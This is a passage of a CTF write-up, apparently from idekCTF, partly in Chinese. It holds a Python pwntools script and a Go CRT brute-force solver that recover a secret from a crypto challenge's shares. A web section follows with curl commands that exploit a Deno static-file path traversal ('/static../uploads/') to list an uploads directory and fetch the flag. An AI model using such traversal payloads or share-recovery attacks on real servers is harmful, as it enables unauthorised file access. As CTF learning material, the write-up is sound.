    # 3. Query the server
    io.sendlineafter(b">>> ", b"1")
    io.sendlineafter(b"What's Your Favorite Prime : ", str(p).encode())

    query_points = [w^k for k in range(12)]
    query_str = ",".join([str(pt) for pt in query_points])

    io.sendlineafter(b"> ", query_str.encode())
    response_line = io.recvline().decode()
    shares_str = response_line.split(" : ")[1]
    shares = [F(s) for s in eval(shares_str)]

    # 4. Use IDFT to calculate candidate coefficients
    candidates = []
    inv12 = F(1)/12
    for m in range(5, 12):
        am = 0
        for k in range(12):
            am += shares[k] * w^(-m * k)
        am *= inv12
        candidates.append(int(am))

    # 5. Feed the data to the Go solver via its stdin
    cand_strs = [str(c) for c in candidates]
    output_line = f"{p},{','.join(cand_strs)}"
    go_stdin.write(output_line + '\n')
    go_stdin.flush()

    print(f"[+] Gathered and sent candidates for p = {p}", file=sys.stderr)

def main():
    # --- Start the Go Solver Subprocess ---
    print("[*] Launching Go solver in the background...", file=sys.stderr)
    try:
        go_proc = subprocess.Popen(
            [GO_SOLVER_PATH],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=sys.stderr,
            text=True,
            bufsize=int(1)
        )
    except FileNotFoundError:
        print(f"[-] Error: Go solver executable not found at '{GO_SOLVER_PATH}'", file=sys.stderr)
        print(f"[-] Please compile it first: go build -o {GO_SOLVER_PATH} solver4_final.go", file=sys.stderr)
        sys.exit(1)

    # --- Interact with Server and Feed Solver ---
    io = remote(HOST, PORT)

    for i in range(N_INTERACTIONS):
        print(f"\n--- Interaction {i+1}/{N_INTERACTIONS} ---", file=sys.stderr)
        try:
            get_candidates_and_feed_solver(io, go_proc.stdin)
        except Exception as e:
            print(f"[-] An error occurred: {e}. Aborting.", file=sys.stderr)
            io.close()
            go_proc.kill()
            sys.exit(1)

    # --- Get Result from Go and Submit ---
    print("\n[*] All candidates sent to Go solver. Closing its input and waiting for the result.", file=sys.stderr)
    go_proc.stdin.close()

    result_dec = go_proc.stdout.readline().strip()
    go_proc.wait()

    if not result_dec:
        print("[-] Go solver finished without finding a solution.", file=sys.stderr)
        io.close()
        return

    print(f"[+] Go solver found the secret! (decimal): {result_dec}", file=sys.stderr)
    secret_hex = hex(int(result_dec))[2:]

    print(f"[*] Submitting final secret (hex): {secret_hex}", file=sys.stderr)
    io.sendlineafter(b">>> ", b"2")
    io.sendlineafter(b"Guess the secret : ", secret_hex.encode())

    io.interactive()
    io.close()

if __name__ == "__main__":
    main()
```

```golang
// Filename: solver4_final.go
package main

import (
	"bufio"
	"fmt"
	"math/big"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/schollz/progressbar/v3"
)

type CrtTask struct {
	Modulus    *big.Int
	Candidates []*big.Int
}

type CrtContext struct {
	nInv  *big.Int
	mInv  *big.Int
	term1 *big.Int
	term2 *big.Int
}

func NewCrtContext() *CrtContext {
	return &CrtContext{
		nInv:  new(big.Int),
		mInv:  new(big.Int),
		term1: new(big.Int),
		term2: new(big.Int),
	}
}

// A robust, symmetric implementation of CRT
func (c *CrtContext) Crt(a, m, b, n *big.Int) (*big.Int, *big.Int) {
	newMod := new(big.Int).Mul(m, n)
	c.nInv.ModInverse(n, m)
	c.term1.Mul(a, n)
	c.term1.Mul(c.term1, c.nInv)
	c.mInv.ModInverse(m, n)
	c.term2.Mul(b, m)
	c.term2.Mul(c.term2, c.mInv)
	result := new(big.Int).Add(c.term1, c.term2)
	result.Mod(result, newMod)
	return result, newMod
}

func findSecretDFS(level int, currentS, currentMod *big.Int, tasks []CrtTask, resultChan chan *big.Int, bar *progressbar.ProgressBar, ctx *CrtContext) *big.Int {
	select {
	case <-resultChan:
		return nil
	default:
	}

	if level == len(tasks) {
		bar.Add(1)
		bound := new(big.Int).Lsh(big.NewInt(1), 640) // 80 bytes * 8 bits/byte
		if currentS.Sign() > 0 && currentS.Cmp(bound) < 0 {
			return currentS
		}
		return nil
	}

	task := tasks[level]
	for _, candidate := range task.Candidates {
		newS, newMod := ctx.Crt(currentS, currentMod, candidate, task.Modulus)
		if result := findSecretDFS(level+1, newS, newMod, tasks, resultChan, bar, ctx); result != nil {
			return result
		}
	}

	return nil
}

func main() {
	numCPU := runtime.NumCPU()
	procs := numCPU - 2
	if procs < 1 {
		procs = 1
	}
	runtime.GOMAXPROCS(procs)
	fmt.Fprintf(os.Stderr, "System has %d CPU cores. Go program will use %d cores.\n", numCPU, procs)

	fmt.Fprintln(os.Stderr, "Go Solver: Waiting for data from stdin...")
	scanner := bufio.NewScanner(os.Stdin)
	var tasks []CrtTask
	for scanner.Scan() {
		parts := strings.Split(scanner.Text(), ",")
		if len(parts) < 2 { continue }
		mod, _ := new(big.Int).SetString(parts[0], 10)
		task := CrtTask{Modulus: mod}
		for i := 1; i < len(parts); i++ {
			cand, _ := new(big.Int).SetString(parts[i], 10)
			if cand.Sign() < 0 {
				cand.Add(cand, mod)
			}
			task.Candidates = append(task.Candidates, cand)
		}
		tasks = append(tasks, task)
	}
	if err := scanner.Err(); err != nil {
		fmt.Fprintf(os.Stderr, "Error reading from stdin: %v\n", err)
		os.Exit(1)
	}
	if len(tasks) == 0 {
		fmt.Fprintln(os.Stderr, "No valid data received from stdin. Exiting.")
		os.Exit(1)
	}
	fmt.Fprintf(os.Stderr, "Go Solver: Received %d sets of candidates. Starting search...\n", len(tasks))

	totalPaths := int64(1)
	for _, task := range tasks {
		totalPaths *= int64(len(task.Candidates))
	}
	bar := progressbar.NewOptions64(
		totalPaths,
		progressbar.OptionSetDescription("Searching"),
		progressbar.OptionSetWriter(os.Stderr),
		progressbar.OptionShowCount(),
		progressbar.OptionSetWidth(40),
		progressbar.OptionThrottle(100*time.Millisecond),
		progressbar.OptionSpinnerType(14),
	)

	startTime := time.Now()
	resultChan := make(chan *big.Int, 1)
	var wg sync.WaitGroup

	initialTask := tasks[0]
	for _, initialCandidate := range initialTask.Candidates {
		wg.Add(1)
		go func(startCand *big.Int, startMod *big.Int) {
			defer wg.Done()
			ctx := NewCrtContext()
			if result := findSecretDFS(1, startCand, startMod, tasks, resultChan, bar, ctx); result != nil {
				select {
				case resultChan <- result:
				default:
				}
			}
		}(initialCandidate, initialTask.Modulus)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	finalSecret, ok := <-resultChan
	bar.Finish()
	duration := time.Since(startTime)

	// --- *** MODIFIED OUTPUT *** ---
	if ok {
		fmt.Println(finalSecret)
		fmt.Fprintf(os.Stderr, "\nGo Solver: Success! Found secret in %v.\n", duration)
	} else {
		fmt.Fprintf(os.Stderr, "\nGo Solver: Search completed, but no valid secret was found.\n")
		fmt.Fprintf(os.Stderr, "Time elapsed: %v\n", duration)
	}
}
```

# Web

## *midi visualizer

deno 启动的 midi server

本地重现环境后，发现可以直接下载 `上传目录` 的文件，但我们并没有文件名，于是构造暴露出目标目录下所有信息

![](content/blog/img/web_localtest.png)

> 更多在于尝试或者读 deno 源码

payload:

```
> curl https://midi-visualizer-web.chal.idek.team/static/../uploads/
Not Found%                                                                 

> curl https://midi-visualizer-web.chal.idek.team/static../uploads/  | rg flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  524k  100  524k    0     0   416k      0  0:00:01  0:00:01 --:--:--  416k
                        <a href="./flag-41589d62bca4bcc031e55ca2.mid">flag-41589d62bca4bcc031e55ca2.mid</a>
```

最后将下载下来的 midi file 上传到当前网站，借助其可视化功能，可以得到 flag

![](content/blog/img/web_midi_flag.png)
